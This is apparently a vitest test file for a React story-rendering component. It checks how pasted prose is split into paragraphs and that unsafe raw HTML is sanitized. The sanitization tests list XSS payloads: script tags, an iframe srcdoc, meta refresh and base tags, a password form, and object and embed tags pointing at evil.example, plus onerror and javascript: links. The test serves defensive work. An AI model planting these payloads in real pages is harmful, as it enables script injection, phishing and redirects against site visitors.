import { describe, it, expect } from 'vitest'
import { render } from '@testing-library/react'
import StoryMarkdown from './StoryMarkdown'

// Author-supplied story bodies are rendered with raw HTML enabled so the
// editor's <u> and <mark> survive. Everything else that raw HTML allows must
// be stripped: a published story is read by every visitor, including keepers
// opening a reported story, and the page CSP allows inline script.
function renderStory(content) {
  const { container } = render(<StoryMarkdown content={content} />)
  return container
}

// A story pasted from a word processor often has ONE line break between
// paragraphs. Rendered as <br>, a 9,000-word story became a single unspaced
// block. Prose lines become paragraphs of their own; short lines (verse, an
// address, a sign) keep their tight line breaks.
describe('StoryMarkdown paragraphs', () => {
  const long1 = 'The thought of life without him had never crossed my mind. Of course, I worried, more than a healthy amount, due to his dangerous lifestyle.'
  const long2 = 'The small green squares had a photo of him sitting on the dock of our hunting camp, a rare moment when he smiled for the camera.'

  it('turns single line breaks between prose lines into separate paragraphs', () => {
    const c = renderStory(`Chapter 1: Best Laid Plans\n${long1}\n${long2}`)
    const ps = [...c.querySelectorAll('p')].map((p) => p.textContent)
    expect(ps).toEqual(['Chapter 1: Best Laid Plans', long1, long2])
    expect(c.querySelector('br')).toBeNull()
  })

  it('keeps inline formatting inside a split paragraph', () => {
    const c = renderStory(`${long1}\nShe *did* understand, and <u>said so</u>, though ${long2}`)
    expect(c.querySelectorAll('p')).toHaveLength(2)
    expect(c.querySelector('p:nth-of-type(2) em')?.textContent).toBe('did')
    expect(c.querySelector('p:nth-of-type(2) u')?.textContent).toBe('said so')
  })

  it('drops lines that hold only invisible characters', () => {
    const c = renderStory(`${long1}\n​\n${long2}`)
    expect(c.querySelectorAll('p')).toHaveLength(2)
  })

  it('keeps short lines together as line breaks', () => {
    const c = renderStory('Roses are red\nViolets are blue\nSomething is under\nThe bed with you')
    expect(c.querySelectorAll('p')).toHaveLength(1)
    expect(c.querySelectorAll('br')).toHaveLength(3)
  })

  it('leaves blank-line paragraphs as they were', () => {
    const c = renderStory(`${long1}\n\n${long2}`)
    expect(c.querySelectorAll('p')).toHaveLength(2)
  })

  it('splits prose lines inside a blockquote', () => {
    const c = renderStory(`> ${long1}\n> ${long2}`)
    expect(c.querySelectorAll('blockquote p')).toHaveLength(2)
  })
})

describe('StoryMarkdown sanitization', () => {
  it('keeps the editor formatting tags <u> and <mark>', () => {
    const c = renderStory('<u>Do not look down</u> and <mark>Forbidden</mark>')
    expect(c.querySelector('u')?.textContent).toBe('Do not look down')
    expect(c.querySelector('mark')?.textContent).toBe('Forbidden')
  })

  it('keeps ordinary markdown', () => {
    const c = renderStory('# Title\n\n**bold** and *italic*')
    expect(c.querySelector('h1')?.textContent).toBe('Title')
    expect(c.querySelector('strong')?.textContent).toBe('bold')
    expect(c.querySelector('em')?.textContent).toBe('italic')
  })

  it.each([
    ['iframe srcdoc', '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>', 'iframe'],
    ['script', '<script>alert(1)</script>', 'script'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">', 'meta'],
    ['base href', '<base href="https://evil.example/">', 'base'],
    ['form', '<form action="https://evil.example"><input type="password" name="p"></form>', 'form'],
    ['style', '<style>body{display:none}</style>', 'style'],
    ['object', '<object data="https://evil.example/x.swf"></object>', 'object'],
    ['embed', '<embed src="https://evil.example/x.swf">', 'embed'],
  ])('strips %s', (_name, payload, tag) => {
    const c = renderStory(payload)
    expect(c.querySelector(tag)).toBeNull()
  })

  it('strips event-handler attributes and javascript: links', () => {
    const c = renderStory('<img src="x" onerror="alert(1)"> <a href="javascript:alert(1)">x</a>')
    const img = c.querySelector('img')
    expect(img?.getAttribute('onerror') ?? null).toBeNull()
    const a = c.querySelector('a')
    expect(a?.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
  })

  it('strips inline style attributes', () => {
    const c = renderStory('<span style="position:fixed;inset:0">overlay</span>')
    expect(c.querySelector('[style]')).toBeNull()
  })
})
